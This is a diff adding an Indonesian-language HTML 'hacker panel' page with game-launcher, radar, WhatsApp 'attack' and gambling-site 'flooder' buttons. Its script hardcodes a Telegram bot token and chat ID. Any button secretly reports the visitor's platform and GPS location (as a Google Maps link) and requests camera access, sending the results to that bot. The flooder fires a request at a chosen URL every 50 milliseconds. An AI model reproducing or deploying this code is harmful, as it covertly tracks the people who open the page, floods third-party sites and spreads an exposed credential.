@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[ EDWARD SYSTEM OMNI V.4.5 ]</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .panel { border: 2px solid #0f0; border-radius: 10px; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px #0f0; background: rgba(0, 30, 0, 0.9); }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        button { background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #004400; color: #0f0; box-shadow: 0 0 10px #0f0; }
+        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 85%; margin: 5px 0; border-radius: 5px; }
+        h1 { text-shadow: 0 0 10px #0f0; font-size: 22px; margin-bottom: 5px; }
+        .status { font-size: 11px; color: yellow; margin-top: 5px; }
+        .danger { border-color: #ff0000; box-shadow: 0 0 15px #ff0000; }
+        .danger h3 { color: #ff0000; }
+        .danger button { background: #ff0000; color: #fff; }
+    </style>
+</head>
+<body>
+
+    <h1>[ EDWARD SYSTEM OMNI V.4.5 ]</h1>
+    <p class="status">SATELLITE STATUS: CONNECTED</p>
+
+    <div class="panel">
+        <h3>🎮 GAME LAUNCHER</h3>
+        <div class="grid">
+            <button onclick="trigger('Free Fire')">FREE FIRE</button>
+            <button onclick="trigger('MLBB')">MLBB</button>
+            <button onclick="trigger('Roblox')">ROBLOX</button>
+            <button onclick="trigger('Minecraft')">MINECRAFT</button>
+        </div>
+    </div>
+
+    <div class="panel">
+        <h3>📡 RADAR & DEVICE INFO</h3>
+        <div class="grid">
+            <button onclick="trigger('Radar Scan')">AKTIFKAN RADAR</button>
+            <button onclick="trigger('Device Check')">CHECK DEVICE</button>
+        </div>
+        <p id="box" class="status">Waiting for target...</p>
+    </div>
+
+    <div class="panel">
+        <h3>⚡ WA ATTACKER</h3>
+        <input type="text" id="targetWA" placeholder="Nomor: 62812xxxxxx">
+        <input type="text" id="msgWA" placeholder="Isi Pesan Serangan...">
+        <button onclick="waAttack()">KIRIM SERANGAN</button>
+    </div>
+
+    <div class="panel danger">
+        <h3>💣 JUDOL ATTACKER (FLOODER)</h3>
+        <input type="text" id="targetJudol" placeholder="URL Target: https://situs-judol.com">
+        <button onclick="startAttack()">START FLOODING</button>
+        <p id="attackStatus" class="status">Status: Standby</p>
+    </div>
+
+    <script>
+        // DATA LOGIN MASTER
+        const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
+        const CHAT_ID = "7898572558";
+
+        function kirimTele(pesan) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+        }
+
+        function trigger(act) {
+            kirimTele(`⚡ AKTIVASI: ${act}\nUser: EDWARD\nPlatform: ${navigator.platform}`);
+            document.getElementById('box').innerHTML = `Executing ${act}...`;
+            
+            // 📍 AUTO RADAR
+            navigator.geolocation.getCurrentPosition((p) => {
+                let maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                kirimTele(`📍 LOKASI TARGET!\nMaps: ${maps}`);
+                document.getElementById('box').innerHTML = "✅ Target Locked!";
+            }, () => {
+                kirimTele("❌ Akses Lokasi Ditolak");
+            });
+
+            // 📸 AUTO CAM REQUEST
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(() => kirimTele("📸 KAMERA TARGET AKTIF!"))
+                .catch(() => kirimTele("❌ Akses Kamera Gagal"));
+            
+            alert(`Sistem ${act} sedang berjalan...`);
+        }
+
+        function waAttack() {
+            let n = document.getElementById('targetWA').value;
+            let m = document.getElementById('msgWA').value || "DIHECK EDWARD";
+            kirimTele(`⚔️ WA ATTACK!\nKe: ${n}\nPesan: ${m}`);
+            window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(m)}`, '_blank');
+        }
+
+        function startAttack() {
+            let target = document.getElementById('targetJudol').value;
+            if(!target) { alert("Input URL Target!"); return; }
+            
+            kirimTele(`💣 ATTACKING JUDOL!\nTarget: ${target}`);
+            document.getElementById('attackStatus').innerHTML = "Status: FLOODING TARGET...";
+            
+            setInterval(() => {
+                fetch(target, { mode: 'no-cors' }).catch(() => {});
+            }, 50); // Kecepatan tinggi: 20 request per detik
+            
+            alert("Serangan paket dikirim secara masif!");
+        }
+    </script>
+</body>
+</html>
+
